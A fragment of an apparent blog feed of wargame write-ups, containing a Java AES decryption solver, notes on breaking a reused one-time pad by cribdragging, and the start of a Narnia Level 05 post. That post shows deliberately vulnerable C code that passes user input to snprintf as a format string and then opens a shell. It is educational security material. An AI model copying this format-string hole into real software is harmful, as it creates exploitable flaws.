&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.awt.image.BufferedImage&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.nio.file.Files&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.nio.file.Paths&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.io.ByteArrayInputStream&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.security.*&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;//MessageDigest;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;javax.crypto.*&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;javax.crypto.spec.*&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;javax.imageio.ImageIO&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;javax.swing.JFrame&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;javax.swing.JPanel&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.io.File&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sun.misc.BASE64Decoder&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sun.misc.BASE64Encoder&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;HelloWorld&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;do_sha&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;String&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;String&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;s1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;throws&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NoSuchAlgorithmException&lt;/span&gt;
    &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;MessageDigest&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;messagedigest&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;MessageDigest&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;getInstance&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;SHA1&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;abyte0&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;StringBuilder&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;valueOf&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;s1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;))).&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;append&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;getBytes&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;j1&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;do&lt;/span&gt;
        &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;j1&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;
            &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;
                &lt;span style=&#34;color: #66d9ef&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;abyte1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;];&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;System&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;arraycopy&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;abyte0&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;abyte1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
                &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;abyte1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;abyte0&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;messagedigest&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;digest&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;abyte0&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;j1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++;&lt;/span&gt;
        &lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;while&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;String&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;hardwork&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;String&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;
    &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;String&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;s1&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;try&lt;/span&gt;
        &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;Cipher&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;cipher&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;Cipher&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;getInstance&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;AES&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;SecretKeySpec&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;secretkeyspec&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;SecretKeySpec&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;do_sha&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;ovaederecumsale&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;10000&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;AES&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;cipher&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;init&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;secretkeyspec&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;BASE64Decoder&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;decoder&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;BASE64Decoder&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;();&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;decodedBytes&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;decoder&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;decodeBuffer&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;8QeNdEdkspV6+1I77SEEEF4aWs5dl/auahJ46MMufkg=&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;plaintxt&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;cipher&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;doFinal&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;decodedBytes&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;BASE64Encoder&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;encoder&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;BASE64Encoder&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;();&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;s1&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;encoder&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;encodeBuffer&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;plaintxt&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;catch&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;Exception&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;exception&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;
        &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt;

        &lt;span style=&#34;color: #f8f8f2&#34;&gt;System&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;System&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;s1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;s1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;args&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;  &lt;span style=&#34;color: #66d9ef&#34;&gt;throws&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;Exception&lt;/span&gt;
    &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;hardwork&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;args&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;]);&lt;/span&gt;
    &lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;challenge-27:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 27&lt;/h1&gt;

&lt;p&gt;One time pad with a reused pad. Another challenge that taught me a lot, specifically
cribdragging. Having found &lt;a href=&#34;https://github.com/SpiderLabs/cribdrag&#34;&gt;this tool&lt;/a&gt; I started
to figure out how to use this.&lt;/p&gt;

&lt;p&gt;Basically you need to take two of the encrypted texts, use the &lt;code&gt;xorstrings&lt;/code&gt; to
xor them together and then pass that to the &lt;code&gt;cribdrag&lt;/code&gt; tool. Then you need to start
entering words that might be in the text. If a word like &lt;code&gt;the&lt;/code&gt;, or &lt;code&gt;and&lt;/code&gt;, are in the
text, you should see some plaintext appear in the output. Then perhaps pad the word
with spaces either side. Once you have more of the plaintext, you can use that to
expand the strings in either text.&lt;/p&gt;

&lt;p&gt;Eventually you will get the plain text for either string. Using that you can then
decipher the other texts.&lt;/p&gt;

&lt;p&gt;The strings increase in length, so combine them all until you have the final
sentence.&lt;/p&gt;

&lt;p&gt;Here&amp;rsquo;s a quick example for a couple of the lines:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://asciinema.org/a/65rhh2rqofe51f0yst1nktmbu&#34;&gt;&lt;img src=&#34;https://asciinema.org/a/65rhh2rqofe51f0yst1nktmbu.png&#34; alt=&#34;asciicast&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Solving Narnia Part 2</title>
      <link>http://unlogic.co.uk/2015/04/13/solving-narnia-part-2/</link>
      <pubDate>Mon, 13 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/04/13/solving-narnia-part-2/</guid>
      <description>

&lt;p&gt;Carrying on from &lt;a href=&#34;http://unlogic.co.uk/2015/04/08/solving-narnia-part1/&#34;&gt;Part 1&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;level-05:100abf89ce6a11fb3cfc3f5a51e9cb94&#34;&gt;Level 05&lt;/h2&gt;

&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
 
&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;snprintf(buffer,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(buffer)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Change i&amp;#39;s value from 1 -&amp;gt; 500. &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;500&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;GOOD&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;system(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

